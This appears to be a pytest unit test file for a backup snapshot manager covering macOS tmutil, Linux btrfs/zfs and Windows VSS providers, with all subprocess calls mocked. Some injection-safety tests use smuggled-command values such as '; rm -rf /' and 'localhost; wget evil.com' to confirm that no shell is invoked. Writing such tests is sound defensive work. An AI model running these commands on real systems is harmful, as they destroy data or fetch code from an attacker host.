"""Unit tests for app.services.snapshot_manager.

All subprocess calls are mocked — no actual tmutil/btrfs/zfs execution.
Run with: python -m pytest backend/tests/unit/test_snapshot_manager.py --noconftest -q
"""
import importlib
import os
import sys
import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch, call

import pytest


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _reload_module(real_recovery: str = ""):
    """Reload snapshot_manager with a specific env var state."""
    mod_name = "app.services.snapshot_manager"
    if mod_name in sys.modules:
        del sys.modules[mod_name]

    env = os.environ.copy()
    if real_recovery:
        env["AEGIS_REAL_RECOVERY"] = real_recovery
    else:
        env.pop("AEGIS_REAL_RECOVERY", None)

    with patch.dict(os.environ, env, clear=True):
        import app.services.snapshot_manager as m
        m.get_snapshot_provider.cache_clear()
    return m


def _make_proc(returncode=0, stdout=b"", stderr=b""):
    p = MagicMock(spec=subprocess.CompletedProcess)
    p.returncode = returncode
    p.stdout = stdout
    p.stderr = stderr
    return p


# ---------------------------------------------------------------------------
# NoopSnapshotProvider (default — no AEGIS_REAL_RECOVERY)
# ---------------------------------------------------------------------------

class TestNoopSnapshotProvider:
    def setup_method(self):
        self.m = _reload_module(real_recovery="")

    def test_verify_recent_returns_true(self):
        provider = self.m.NoopSnapshotProvider()
        assert provider.verify_recent("host-1") is True

    def test_list_snapshots_returns_synthetic_list(self):
        provider = self.m.NoopSnapshotProvider()
        snaps = provider.list_snapshots("host-1")
        assert isinstance(snaps, list)
        assert len(snaps) >= 1
        snap = snaps[0]
        assert hasattr(snap, "id")
        assert hasattr(snap, "created_at")
        assert hasattr(snap, "host_id")
        assert snap.host_id == "host-1"

    def test_restore_returns_job(self):
        provider = self.m.NoopSnapshotProvider()
        snaps = provider.list_snapshots("host-1")
        job = provider.restore("host-1", snaps[0].id, "/tmp/restore")
        assert hasattr(job, "job_id")
        assert hasattr(job, "status")
        assert job.status in ("pending", "running", "completed", "failed")

    def test_get_snapshot_provider_returns_noop_without_env(self):
        """get_snapshot_provider must return NoopSnapshotProvider when env is unset."""
        with patch.dict(os.environ, {}, clear=True):
            self.m.get_snapshot_provider.cache_clear()
            provider = self.m.get_snapshot_provider()
        assert isinstance(provider, self.m.NoopSnapshotProvider)


# ---------------------------------------------------------------------------
# MacOSSnapshotProvider
# ---------------------------------------------------------------------------

class TestMacOSSnapshotProvider:
    def setup_method(self):
        self.m = _reload_module(real_recovery="1")
        self.provider = self.m.MacOSSnapshotProvider()

    def test_list_snapshots_happy_path(self):
        tmutil_output = (
            b"2026-04-28-120000\n"
            b"2026-04-29-120000\n"
            b"2026-04-30-120000\n"
        )
        with patch("subprocess.run", return_value=_make_proc(stdout=tmutil_output)) as mock_run:
            snaps = self.provider.list_snapshots("localhost")

        # Verify subprocess received safe argv (no shell injection)
        mock_run.assert_called_once()
        argv = mock_run.call_args[0][0]
        assert isinstance(argv, list), "subprocess must be called with a list, not a shell string"
        assert argv[0] == "tmutil"
        assert "listlocalsnapshots" in argv

        assert len(snaps) == 3
        assert all(hasattr(s, "id") for s in snaps)

    def test_verify_recent_true_when_fresh_snapshot(self):
        from datetime import datetime, timezone, timedelta
        recent_date = (datetime.now(timezone.utc) - timedelta(hours=12)).strftime("%Y-%m-%d-%H%M%S")
        tmutil_output = recent_date.encode() + b"\n"
        with patch("subprocess.run", return_value=_make_proc(stdout=tmutil_output)):
            result = self.provider.verify_recent("localhost")
        assert result is True

    def test_verify_recent_false_when_no_snapshots(self):
        with patch("subprocess.run", return_value=_make_proc(stdout=b"")):
            result = self.provider.verify_recent("localhost")
        assert result is False

    def test_restore_happy_path(self):
        with patch("subprocess.run", return_value=_make_proc(returncode=0)) as mock_run:
            job = self.provider.restore("localhost", "2026-04-30-120000", "/tmp/restore-target")

        argv = mock_run.call_args[0][0]
        assert isinstance(argv, list)
        assert argv[0] == "tmutil"
        assert job.status in ("completed", "pending", "running")

    def test_restore_returns_failed_job_on_subprocess_error(self):
        with patch("subprocess.run", return_value=_make_proc(returncode=1, stderr=b"error")):
            job = self.provider.restore("localhost", "2026-04-30-120000", "/tmp/restore-target")
        assert job.status == "failed"

    def test_injection_safety_host_id(self):
        """Malicious host_id must not reach subprocess as a shell-injectable string."""
        malicious = "; rm -rf /"
        with patch("subprocess.run", return_value=_make_proc(stdout=b"")) as mock_run:
            self.provider.list_snapshots(malicious)

        if mock_run.called:
            argv = mock_run.call_args[0][0]
            # argv must be a list — shell=True never used
            assert isinstance(argv, list)
            # The malicious string must NOT appear verbatim as a single token
            # that would be executed by a shell
            full_cmd = " ".join(argv)
            assert "rm -rf" not in full_cmd or malicious not in argv

    def test_injection_safety_snapshot_id(self):
        """Malicious snapshot_id must not be passed verbatim in a shell context."""
        malicious_snap = "2026-04-30; rm -rf /"
        malicious_path = "/tmp/safe"
        with patch("subprocess.run", return_value=_make_proc(returncode=0)) as mock_run:
            job = self.provider.restore("localhost", malicious_snap, malicious_path)

        if mock_run.called:
            argv = mock_run.call_args[0][0]
            assert isinstance(argv, list)
            # subprocess must not use shell=True
            call_kwargs = mock_run.call_args[1]
            assert call_kwargs.get("shell", False) is False


# ---------------------------------------------------------------------------
# LinuxSnapshotProvider
# ---------------------------------------------------------------------------

class TestLinuxSnapshotProvider:
    def setup_method(self):
        self.m = _reload_module(real_recovery="1")
        self.provider = self.m.LinuxSnapshotProvider()

    def test_list_snapshots_btrfs_happy_path(self):
        btrfs_output = (
            b"ID 256 gen 100 top level 5 path @snapshots/2026-04-28\n"
            b"ID 257 gen 101 top level 5 path @snapshots/2026-04-29\n"
        )
        with patch("subprocess.run") as mock_run:
            # First call btrfs, second call zfs (falls back)
            mock_run.side_effect = [
                _make_proc(returncode=0, stdout=btrfs_output),
            ]
            snaps = self.provider.list_snapshots("localhost")

        argv = mock_run.call_args_list[0][0][0]
        assert isinstance(argv, list)
        assert argv[0] == "btrfs"
        assert len(snaps) >= 1

    def test_list_snapshots_falls_back_to_zfs(self):
        zfs_output = (
            b"pool/data@2026-04-28\t0\t-\t1.5G\t-\n"
            b"pool/data@2026-04-29\t0\t-\t1.5G\t-\n"
        )
        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = [
                _make_proc(returncode=1, stderr=b"btrfs not found"),  # btrfs fails
                _make_proc(returncode=0, stdout=zfs_output),           # zfs succeeds
            ]
            snaps = self.provider.list_snapshots("localhost")

        assert len(snaps) >= 1

    def test_list_snapshots_both_fail_returns_empty(self):
        with patch("subprocess.run", return_value=_make_proc(returncode=1, stderr=b"not found")):
            snaps = self.provider.list_snapshots("localhost")
        assert snaps == []

    def test_restore_calls_subprocess_with_list(self):
        with patch("subprocess.run", return_value=_make_proc(returncode=0)) as mock_run:
            job = self.provider.restore("localhost", "pool/data@2026-04-29", "/tmp/restore")

        argv = mock_run.call_args[0][0]
        assert isinstance(argv, list)

    def test_injection_safety_host_id(self):
        malicious = "localhost; wget evil.com"
        with patch("subprocess.run", return_value=_make_proc(returncode=1)):
            snaps = self.provider.list_snapshots(malicious)
        # Must not raise; result is empty or synthetic
        assert isinstance(snaps, list)


# ---------------------------------------------------------------------------
# WindowsSnapshotProvider — Real VSS tests (FR-09)
# ---------------------------------------------------------------------------

SAMPLE_VSS_OUTPUT = b"""
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {3b644458-7ca8-472d-862d-0b63b2a2ddc0}
   Contained 1 shadow copies at creation time: 10/12/2026 14:30:15
      Shadow Copy ID: {b8e8f81e-45fa-4c48-8df0-e889a77b8b73}
         Original Volume: (C:)\\\\?\\Volume{7e0ddf18-0000-0000-0000-100000000000}\\
         Shadow Copy Volume: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1
         Originating Machine: WIN-ENDPOINT-01
         Service Machine: WIN-ENDPOINT-01
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Differential, Auto_Release
"""


class TestWindowsSnapshotProvider:
    def setup_method(self):
        self.m = _reload_module(real_recovery="1")
        self.provider = self.m.WindowsSnapshotProvider()

    def test_list_snapshots_parses_vss_output(self):
        with patch("subprocess.run", return_value=_make_proc(returncode=0, stdout=SAMPLE_VSS_OUTPUT)) as mock_run:
            snaps = self.provider.list_snapshots("win-host-1")

        mock_run.assert_called_once()
        argv = mock_run.call_args[0][0]
        assert argv == ["vssadmin", "list", "shadows"]
        assert len(snaps) == 1
        snap = snaps[0]
        assert snap.id == "{b8e8f81e-45fa-4c48-8df0-e889a77b8b73}"
        assert snap.provider == "vss"
        assert "HarddiskVolumeShadowCopy1" in (snap.label or "")

    def test_verify_recent_true_when_fresh_snapshot(self):
        with patch("subprocess.run", return_value=_make_proc(returncode=0, stdout=SAMPLE_VSS_OUTPUT)):
            # With _MAX_SNAPSHOT_AGE_HOURS mocked or fresh timestamp
            with patch.object(self.m.Snapshot, "age_hours", return_value=5.0):
                result = self.provider.verify_recent("win-host-1")
        assert result is True

    def test_verify_recent_false_when_empty_output(self):
        with patch("subprocess.run", return_value=_make_proc(returncode=0, stdout=b"No items found that satisfy the query.")):
            result = self.provider.verify_recent("win-host-1")
        assert result is False

    def test_create_snapshot_happy_path(self):
        create_output = (
            b"Successfully created shadow copy for 'C:'\n"
            b"    Shadow Copy ID: {b8e8f81e-45fa-4c48-8df0-e889a77b8b73}\n"
            b"    Shadow Copy Volume Name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\n"
        )
        with patch("subprocess.run", return_value=_make_proc(returncode=0, stdout=create_output)) as mock_run:
            snap = self.provider.create_snapshot("C:")

        mock_run.assert_called_once()
        argv = mock_run.call_args[0][0]
        assert argv[0] == "vssadmin"
        assert "create" in argv
        assert snap.id == "{b8e8f81e-45fa-4c48-8df0-e889a77b8b73}"

    def test_restore_boundary_rejection_live_root(self):
        """Live full-system volume rollback must be rejected with explicit guidance."""
        for root_path in ["C:", "C:\\", "/", ""]:
            job = self.provider.restore("win-host-1", "{b8e8f81e-45fa-4c48-8df0-e889a77b8b73}", root_path)
            assert job.status == "failed"
            assert "Live full-system volume rollback is not supported online" in (job.error or "")

    def test_restore_path_traversal_protection(self):
        """Restoring into Windows system root directory must be rejected."""
        with patch.dict(os.environ, {"SystemRoot": r"C:\Windows"}):
            job = self.provider.restore(
                "win-host-1",
                "{b8e8f81e-45fa-4c48-8df0-e889a77b8b73}",
                r"C:\Windows\System32\drivers",
            )
            assert job.status == "failed"
            assert "Invalid target path" in (job.error or "")

    def test_restore_dry_run_validation(self):
        """Dry-run validates paths and returns completed without writing."""
        with patch("subprocess.run") as mock_run:
            job = self.provider.restore(
                "win-host-1",
                "{b8e8f81e-45fa-4c48-8df0-e889a77b8b73}",
                r"C:\SafeRestore\Target",
                dry_run=True,
            )
        assert job.status == "completed"
        assert job.error is None
        # In dry run, robocopy is NOT called
        mock_run.assert_not_called()

    def test_restore_happy_path_robocopy(self):
        """Restoration queries shadow device and executes robocopy safely."""
        with patch("subprocess.run") as mock_run, patch("pathlib.Path.mkdir"):
            # 1st call: list shadows -> returns shadow volume device
            # 2nd call: robocopy -> returncode 1 (successful copy)
            mock_run.side_effect = [
                _make_proc(returncode=0, stdout=SAMPLE_VSS_OUTPUT),
                _make_proc(returncode=1, stdout=b"Files copied: 10"),
            ]
            job = self.provider.restore(
                "win-host-1",
                "{b8e8f81e-45fa-4c48-8df0-e889a77b8b73}",
                r"C:\SafeRestore\Target",
                dry_run=False,
            )

        assert job.status == "completed"
        assert mock_run.call_count == 2
        robocopy_argv = mock_run.call_args_list[1][0][0]
        assert robocopy_argv[0] == "robocopy"
        assert "HarddiskVolumeShadowCopy1" in robocopy_argv[1]


# ---------------------------------------------------------------------------
# get_snapshot_provider factory
# ---------------------------------------------------------------------------

class TestGetSnapshotProvider:
    def test_returns_noop_without_env(self):
        m = _reload_module(real_recovery="")
        with patch.dict(os.environ, {}, clear=True):
            m.get_snapshot_provider.cache_clear()
            provider = m.get_snapshot_provider()
        assert isinstance(provider, m.NoopSnapshotProvider)

    def test_returns_platform_provider_with_env(self):
        m = _reload_module(real_recovery="1")
        with patch.dict(os.environ, {"AEGIS_REAL_RECOVERY": "1"}):
            m.get_snapshot_provider.cache_clear()
            provider = m.get_snapshot_provider()
        # Should be one of the real providers (not Noop)
        assert not isinstance(provider, m.NoopSnapshotProvider)
